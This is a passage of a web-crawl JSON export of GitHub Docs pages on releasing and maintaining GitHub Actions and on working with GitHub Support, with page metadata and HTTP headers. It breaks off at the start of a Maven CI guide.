    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Releasing and maintaining actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "D8E7:84D71:F7A5B9:14053CF:681C5144",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:57 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686277.723498, VS0, VE351",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27258",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Releasing and maintaining actions - GitHub Docs\nYou can leverage automation and open source best practices to release and maintain actions.\nIntroduction\nAfter you create an action, you'll want to continue releasing new features while working with community contributions. This tutorial describes an example process you can follow to release and maintain actions in open source. The example:\nLeverages GitHub Actions for continuous integration, dependency updates, release management, and task automation.\nProvides confidence through automated tests and build badges.\nIndicates how the action can be used, ideally as part of a broader workflow.\nSignal what type of community contributions you welcome. (For example, issues, pull requests, or vulnerability reports.)\nFor an applied example of this process, see actions/javascript-action.\nDeveloping and releasing actions\nIn this section, we discuss an example process for developing and releasing actions and show how to use GitHub Actions to automate the process.\nAbout JavaScript actions\nJavaScript actions are Node.js repositories with metadata. However, JavaScript actions have additional properties compared to traditional Node.js projects:\nDependent packages are committed alongside the code, typically in a compiled and minified form. This means that automated builds and secure community contributions are important.\nTagged releases can be published directly to GitHub Marketplace and consumed by workflows across GitHub.\nMany actions make use of GitHub's APIs and third party APIs, so we encourage robust end-to-end testing.\nSetting up GitHub Actions workflows\nTo support the developer process in the next section, add two GitHub Actions workflows to your repository:\nAdd a workflow that triggers when a commit is pushed to a feature branch or to main or when a pull request is created. Configure the workflow to run your unit and integration tests. For an example, see this workflow.\nAdd a workflow that triggers when a release is published or edited. Configure the workflow to ensure semantic tags are in place. You can use an action like JasonEtco/build-and-tag-action to compile and bundle the JavaScript and metadata file and force push semantic major, minor, and patch tags. For more information about semantic tags, see About semantic versioning.\nExample developer process\nHere is an example process that you can follow to automatically run tests, create a release and publish to GitHub Marketplace, and publish your action.\nDo feature work in branches per GitHub flow. For more information, see GitHub flow.\nWhenever a commit is pushed to the feature branch, your testing workflow will automatically run the tests.\nCreate pull requests to the main branch to initiate discussion and review, merging when ready.\nWhen a pull request is opened, either from a branch or a fork, your testing workflow will again run the tests, this time with the merge commit.\nNote: for security reasons, workflows triggered by pull_request from forks have restricted GITHUB_TOKEN permissions and do not have access to secrets. If your tests or other workflows triggered upon pull request require access to secrets, consider using a different event like a manual trigger or a pull_request_target. For more information, see Events that trigger workflows.\nCreate a semantically tagged release. You may also publish to GitHub Marketplace with a simple checkbox. For more information, see Managing releases in a repository and Publishing actions in GitHub Marketplace.\nWhen a release is published or edited, your release workflow will automatically take care of compilation and adjusting tags.\nWe recommend creating releases using semantically versioned tags – for example, v1.1.3 – and keeping major (v1) and minor (v1.1) tags current to the latest appropriate commit. For more information, see About custom actions and About semantic versioning.\nResults\nUnlike some other automated release management strategies, this process intentionally does not commit dependencies to the main branch, only to the tagged release commits. By doing so, you encourage users of your action to reference named tags or shas, and you help ensure the security of third party pull requests by doing the build yourself during a release.\nUsing semantic releases means that the users of your actions can pin their workflows to a version and know that they might continue to receive the latest stable, non-breaking features, depending on their comfort level.\nGitHub provides tools and guides to help you work with the open source community. Here are a few tools we recommend setting up for healthy bidirectional communication. By providing the following signals to the community, you encourage others to use, modify, and contribute to your action:\nMaintain a README with plenty of usage examples and guidance. For more information, see About READMEs.\nInclude a workflow status badge in your README file. For more information, see Adding a workflow status badge. Also visit shields.io to learn about other badges that you can add.\nAdd community health files like CODE_OF_CONDUCT, CONTRIBUTING, and SECURITY. For more information, see Creating a default community health file.\nKeep issues current by utilizing actions like actions/stale.\nUse GitHub's security features to communicate about vulnerabilities and how to fix them. For more information, see Using GitHub's security features to secure your use of GitHub Actions.\nFurther reading\nExamples where similar patterns are employed include:\ngithub/super-linter\noctokit/request-action\nactions/javascript-action",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-releasing-and-maintaining-actions-iqipt.html",
  "markdown": "# Releasing and maintaining actions - GitHub Docs\n\nYou can leverage automation and open source best practices to release and maintain actions.\n\n## [Introduction](#introduction)\n\nAfter you create an action, you'll want to continue releasing new features while working with community contributions. This tutorial describes an example process you can follow to release and maintain actions in open source. The example:\n\n*   Leverages GitHub Actions for continuous integration, dependency updates, release management, and task automation.\n*   Provides confidence through automated tests and build badges.\n*   Indicates how the action can be used, ideally as part of a broader workflow.\n*   Signal what type of community contributions you welcome. (For example, issues, pull requests, or vulnerability reports.)\n\nFor an applied example of this process, see [actions/javascript-action](https://github.com/actions/javascript-action).\n\n## [Developing and releasing actions](#developing-and-releasing-actions)\n\nIn this section, we discuss an example process for developing and releasing actions and show how to use GitHub Actions to automate the process.\n\n### [About JavaScript actions](#about-javascript-actions)\n\nJavaScript actions are Node.js repositories with metadata. However, JavaScript actions have additional properties compared to traditional Node.js projects:\n\n*   Dependent packages are committed alongside the code, typically in a compiled and minified form. This means that automated builds and secure community contributions are important.\n    \n*   Tagged releases can be published directly to GitHub Marketplace and consumed by workflows across GitHub.\n    \n*   Many actions make use of GitHub's APIs and third party APIs, so we encourage robust end-to-end testing.\n    \n\n### [Setting up GitHub Actions workflows](#setting-up-github-actions-workflows)\n\nTo support the developer process in the next section, add two GitHub Actions workflows to your repository:\n\n1.  Add a workflow that triggers when a commit is pushed to a feature branch or to `main` or when a pull request is created. Configure the workflow to run your unit and integration tests. For an example, see [this workflow](https://github.com/actions/javascript-action/blob/main/.github/workflows/ci.yml).\n2.  Add a workflow that triggers when a release is published or edited. Configure the workflow to ensure semantic tags are in place. You can use an action like [JasonEtco/build-and-tag-action](https://github.com/JasonEtco/build-and-tag-action) to compile and bundle the JavaScript and metadata file and force push semantic major, minor, and patch tags. For more information about semantic tags, see [About semantic versioning](https://docs.npmjs.com/about-semantic-versioning).\n\n### [Example developer process](#example-developer-process)\n\nHere is an example process that you can follow to automatically run tests, create a release and publish to GitHub Marketplace, and publish your action.\n\n1.  Do feature work in branches per GitHub flow. For more information, see [GitHub flow](https://docs.github.com/en/get-started/using-github/github-flow).\n    \n    *   Whenever a commit is pushed to the feature branch, your testing workflow will automatically run the tests.\n2.  Create pull requests to the `main` branch to initiate discussion and review, merging when ready.\n    \n    *   When a pull request is opened, either from a branch or a fork, your testing workflow will again run the tests, this time with the merge commit.\n        \n    *   **Note:** for security reasons, workflows triggered by `pull_request` from forks have restricted `GITHUB_TOKEN` permissions and do not have access to secrets. If your tests or other workflows triggered upon pull request require access to secrets, consider using a different event like a [manual trigger](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#manual-events) or a [`pull_request_target`](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target). For more information, see [Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull-request-events-for-forked-repositories).\n        \n3.  Create a semantically tagged release. You may also publish to GitHub Marketplace with a simple checkbox. For more information, see [Managing releases in a repository](https://docs.github.com/en/repositories/releasing-projects-on-github/managing-releases-in-a-repository#creating-a-release) and [Publishing actions in GitHub Marketplace](https://docs.github.com/en/actions/creating-actions/publishing-actions-in-github-marketplace#publishing-an-action).\n    \n    *   When a release is published or edited, your release workflow will automatically take care of compilation and adjusting tags.\n        \n    *   We recommend creating releases using semantically versioned tags – for example, `v1.1.3` – and keeping major (`v1`) and minor (`v1.1`) tags current to the latest appropriate commit. For more information, see [About custom actions](https://docs.github.com/en/actions/creating-actions/about-custom-actions#using-release-management-for-actions) and [About semantic versioning](https://docs.npmjs.com/about-semantic-versioning).\n        \n\n### [Results](#results)\n\nUnlike some other automated release management strategies, this process intentionally does not commit dependencies to the `main` branch, only to the tagged release commits. By doing so, you encourage users of your action to reference named tags or `sha`s, and you help ensure the security of third party pull requests by doing the build yourself during a release.\n\nUsing semantic releases means that the users of your actions can pin their workflows to a version and know that they might continue to receive the latest stable, non-breaking features, depending on their comfort level.\n\nGitHub provides tools and guides to help you work with the open source community. Here are a few tools we recommend setting up for healthy bidirectional communication. By providing the following signals to the community, you encourage others to use, modify, and contribute to your action:\n\n*   Maintain a `README` with plenty of usage examples and guidance. For more information, see [About READMEs](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-readmes).\n*   Include a workflow status badge in your `README` file. For more information, see [Adding a workflow status badge](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/adding-a-workflow-status-badge). Also visit [shields.io](https://shields.io/) to learn about other badges that you can add.\n*   Add community health files like `CODE_OF_CONDUCT`, `CONTRIBUTING`, and `SECURITY`. For more information, see [Creating a default community health file](https://docs.github.com/en/communities/setting-up-your-project-for-healthy-contributions/creating-a-default-community-health-file#supported-file-types).\n*   Keep issues current by utilizing actions like [actions/stale](https://github.com/actions/stale).\n*   Use GitHub's security features to communicate about vulnerabilities and how to fix them. For more information, see [Using GitHub's security features to secure your use of GitHub Actions](https://docs.github.com/en/actions/security-guides/using-githubs-security-features-to-secure-your-use-of-github-actions#protecting-actions-youve-created).\n\n## [Further reading](#further-reading)\n\nExamples where similar patterns are employed include:\n\n*   [github/super-linter](https://github.com/github/super-linter)\n*   [octokit/request-action](https://github.com/octokit/request-action)\n*   [actions/javascript-action](https://github.com/actions/javascript-action)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 260,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-releasing-and-maintaining-actions-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-releasing-and-maintaining-actions-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-releasing-and-maintaining-actions-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-releasing-and-maintaining-actions-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-releasing-and-maintaining-actions-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 9970,
      "readableText": 9119,
      "none": 29188,
      "readableTextIfPossible": 29188,
      "result": 9119,
      "markdown": 7817
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/working-with-support-for-github-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/working-with-support-for-github-actions",
    "loadedTime": "2025-05-08T06:38:09.208Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/working-with-support-for-github-actions",
    "title": "Working with Support for GitHub Actions - GitHub Docs",
    "description": "Learn how GitHub Support can assist with GitHub Actions",
    "author": null,
    "keywords": "Actions,Support",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Working with Support for GitHub Actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/working-with-support-for-github-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/working-with-support-for-github-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "E9B6:203D3B:CDF6C9:116A2AE:681C5138",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:03 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686283.118144, VS0, VE317",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "26695",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Working with Support for GitHub Actions\nLearn how GitHub Support can assist with GitHub Actions\nYou can contact GitHub Support for assistance with GitHub Actions.\nProviding diagnostic and troubleshooting information\nThe contents of private and internal repositories are not visible to GitHub Support, so GitHub Support may request additional information to understand the complete context of your inquiry and reproduce any unexpected behavior. You can accelerate the resolution of your inquiry by providing this information when you initially raise a ticket with GitHub Support.\nSome information that GitHub Support will request can include, but is not limited to, the following:\nThe URL of the workflow run.\nFor example: https://github.com/ORG/REPO/actions/runs/0123456789\nThe workflow .yml file(s) attached to the ticket as .txt files. For more information about workflows, see About workflows.\nA copy of your workflow run logs for an example workflow run failure. For more information about workflow run logs, see Using workflow run logs.\nIf you are running this workflow on a self-hosted runner, self-hosted runner logs which can be found under the _diag folder within the runner. For more information about self-hosted runners, see Monitoring and troubleshooting self-hosted runners.\nSelf-hosted runner log file names are be formatted: Runner_YYYY####-xxxxxx-utc.log and Worker_YYYY####-xxxxxx-utc.log.\nNote\nAttach files to your support ticket by changing the file's extension to .txt or .zip. If you include textual data such as log or workflow file snippets inline in your ticket, ensure they are formatted correctly as Markdown code blocks. For more information about proper Markdown formatting, see Basic writing and formatting syntax.\nIf the information you provide is unreadable due to the loss of formatting by improper Markdown syntax, GitHub Support may request that resubmit the information either as an attachment or with the correct Markdown formatting.\nWarning\nEnsure all files and text provided to GitHub Support have been properly redacted to remove sensitive information such as tokens and other secrets.\nEphemeral Runner Application Log Files\nGitHub Support may request the runner application log files from ephemeral runners. GitHub expects and recommends that you have implemented a mechanism to forward and preserve the runner application log files from self-hosted ephemeral runners. For more information about runner application log files and troubleshooting self-hosted runners, see Monitoring and troubleshooting self-hosted runners.\nActions Runner Controller\nIf you are using Actions Runner Controller (ARC), GitHub Support may ask you to submit the complete logs for the controller, listeners, and runner pods. For more information about collecting Actions Runner Controller's logs, see Troubleshooting Actions Runner Controller errors.\nFor more information about the scope of support for Actions Runner Controller, see About support for Actions Runner Controller.\nCodeQL and GitHub Actions\nIf you are requesting assistance with a CodeQL analysis workflow, GitHub Support may request a copy of the CodeQL debugging artifacts. For more information about debugging artifacts for a CodeQL analysis workflow, see Logs are not detailed enough.\nTo provide the debugging artifacts to GitHub Support, please download the CodeQL debugging artifacts from a sample workflow run and attach it to your ticket as a .zip file. For more information on downloading workflow artifacts, see Downloading workflow artifacts.\nIf the CodeQL debugging artifacts .zip file is too large to upload to the ticket, please advise GitHub Support, and we will work with you to determine the next steps.\nScope of support\nIf your support request is outside of the scope of what our team can help you with, we may recommend next steps to resolve your issue outside of GitHub Support. Your support request is possibly out of GitHub Support's scope if the request is primarily about:\nThird party integrations, such as Jira\nCI/CD, such as Jenkins\nWriting scripts\nConfiguration of external authentication systems, such as SAML identity providers\nOpen source projects\nWriting or debugging new queries for CodeQL\nCloud provider configurations, such as virtual network setup, custom firewall, or proxy rules\nContainer orchestration, such as Kubernetes setup, or networking\nDetailed assistance with workflows and data management\nPreview features. Public preview and private preview features are out of GitHub Support's scope.\nFor detailed assistance with workflows and data management, consult GitHub Expert Services, which offer specialized support to help you optimize your use of the platform.\nIf you're uncertain if the issue is out of scope, open a ticket and we're happy to help you determine the best way to proceed.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-working-with-support-for-github-actions-yvs2v.html",
  "markdown": "# Working with Support for GitHub Actions\n\nLearn how GitHub Support can assist with GitHub Actions\n\nYou can [contact GitHub Support](https://docs.github.com/en/support/contacting-github-support) for assistance with GitHub Actions.\n\n## [Providing diagnostic and troubleshooting information](#providing-diagnostic-and-troubleshooting-information)\n\nThe contents of private and internal repositories are not visible to GitHub Support, so GitHub Support may request additional information to understand the complete context of your inquiry and reproduce any unexpected behavior. You can accelerate the resolution of your inquiry by providing this information when you initially raise a ticket with GitHub Support.\n\nSome information that GitHub Support will request can include, but is not limited to, the following:\n\n*   The URL of the workflow run.\n    \n    For example: `https://github.com/ORG/REPO/actions/runs/0123456789`\n    \n*   The workflow `.yml` file(s) attached to the ticket as `.txt` files. For more information about workflows, see [About workflows](https://docs.github.com/en/actions/using-workflows/about-workflows#about-workflows).\n    \n*   A copy of your workflow run logs for an example workflow run failure. For more information about workflow run logs, see [Using workflow run logs](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/using-workflow-run-logs#downloading-logs).\n    \n*   If you are running this workflow on a self-hosted runner, self-hosted runner logs which can be found under the `_diag` folder within the runner. For more information about self-hosted runners, see [Monitoring and troubleshooting self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners#reviewing-the-self-hosted-runner-application-log-files).\n    \n    Self-hosted runner log file names are be formatted: `Runner_YYYY####-xxxxxx-utc.log` and `Worker_YYYY####-xxxxxx-utc.log`.\n    \n\nNote\n\nAttach files to your support ticket by changing the file's extension to `.txt` or `.zip`. If you include textual data such as log or workflow file snippets inline in your ticket, ensure they are formatted correctly as Markdown code blocks. For more information about proper Markdown formatting, see [Basic writing and formatting syntax](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax#quoting-code).\n\nIf the information you provide is unreadable due to the loss of formatting by improper Markdown syntax, GitHub Support may request that resubmit the information either as an attachment or with the correct Markdown formatting.\n\nWarning\n\nEnsure all files and text provided to GitHub Support have been properly redacted to remove sensitive information such as tokens and other secrets.\n\n### [Ephemeral Runner Application Log Files](#ephemeral-runner-application-log-files)\n\nGitHub Support may request the runner application log files from ephemeral runners. GitHub expects and recommends that you have implemented a mechanism to forward and preserve the runner application log files from self-hosted ephemeral runners. For more information about runner application log files and troubleshooting self-hosted runners, see [Monitoring and troubleshooting self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners#reviewing-the-self-hosted-runner-application-log-files).\n\n### [Actions Runner Controller](#actions-runner-controller)\n\nIf you are using Actions Runner Controller (ARC), GitHub Support may ask you to submit the complete logs for the controller, listeners, and runner pods. For more information about collecting Actions Runner Controller's logs, see [Troubleshooting Actions Runner Controller errors](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors#checking-the-logs-of-the-controller-and-runner-set-listener).\n\nFor more information about the scope of support for Actions Runner Controller, see [About support for Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-support-for-actions-runner-controller).\n\n### [CodeQL and GitHub Actions](#codeql-and-github-actions)\n\nIf you are requesting assistance with a CodeQL analysis workflow, GitHub Support may request a copy of the CodeQL debugging artifacts. For more information about debugging artifacts for a CodeQL analysis workflow, see [Logs are not detailed enough](https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough#creating-codeql-debugging-artifacts).\n\nTo provide the debugging artifacts to GitHub Support, please download the CodeQL debugging artifacts from a sample workflow run and attach it to your ticket as a `.zip` file. For more information on downloading workflow artifacts, see [Downloading workflow artifacts](https://docs.github.com/en/actions/managing-workflow-runs/downloading-workflow-artifacts).\n\nIf the CodeQL debugging artifacts `.zip` file is too large to upload to the ticket, please advise GitHub Support, and we will work with you to determine the next steps.\n\n## [Scope of support](#scope-of-support)\n\nIf your support request is outside of the scope of what our team can help you with, we may recommend next steps to resolve your issue outside of GitHub Support. Your support request is possibly out of GitHub Support's scope if the request is primarily about:\n\n*   Third party integrations, such as Jira\n*   CI/CD, such as Jenkins\n*   Writing scripts\n*   Configuration of external authentication systems, such as SAML identity providers\n*   Open source projects\n*   Writing or debugging new queries for CodeQL\n*   Cloud provider configurations, such as virtual network setup, custom firewall, or proxy rules\n*   Container orchestration, such as Kubernetes setup, or networking\n*   Detailed assistance with workflows and data management\n*   Preview features. Public preview and private preview features are out of GitHub Support's scope.\n\nFor detailed assistance with workflows and data management, consult [GitHub Expert Services](https://github.com/services/), which offer specialized support to help you optimize your use of the platform.\n\nIf you're uncertain if the issue is out of scope, open a ticket and we're happy to help you determine the best way to proceed.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 245,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-working-with-support-for-github-actions-original",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-working-with-support-for-github-actions-removedE",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-working-with-support-for-github-actions-extractu",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-working-with-support-for-github-actions-readable",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-working-with-support-for-github-actions-readable"
    },
    "lengths": {
      "extractus": 8322,
      "readableText": 7656,
      "none": 28387,
      "readableTextIfPossible": 7656,
      "result": 7656,
      "markdown": 6652
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-maven",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-maven",
    "loadedTime": "2025-05-08T06:38:11.120Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-maven",
    "title": "Building and testing Java with Maven - GitHub Docs",
    "description": "You can create a continuous integration (CI) workflow in GitHub Actions to build and test your Java project with Maven.",
    "author": null,
    "keywords": "CI,Java,Maven",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Building and testing Java with Maven - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-maven"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-maven"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "5431:1FB90B:ED88E3:1363D2E:681C5133",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:05 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686285.316652, VS0, VE231",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28359",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Building and testing Java with Maven\nYou can create a continuous integration (CI) workflow in GitHub Actions to build and test your Java project with Maven.\nIntroduction\nThis guide shows you how to create a workflow that performs continuous integration (CI) for your Java project using the Maven software project management tool. The workflow you create will allow you to see when commits to a pull request cause build or test failures against your default branch; this approach can help ensure that your code is always healthy. You can extend your CI workflow to cache files and upload artifacts from a workflow run.\nGitHub-hosted runners have a tools cache with pre-installed software, which includes Java Development Kits (JDKs) and Maven. For a list of software and the pre-installed versions for JDK and Maven, see Using GitHub-hosted runners.\nPrerequisites\nYou should be familiar with YAML and the syntax for GitHub Actions. For more information, see:\nWorkflow syntax for GitHub Actions\nWriting workflows\nWe recommend that you have a basic understanding of Java and the Maven framework. For more information, see the Maven Getting Started Guide in the Maven documentation.\nUsing a Maven workflow template\nTo get started quickly, add a workflow template to the .github/workflows directory of your repository.\nGitHub provides a 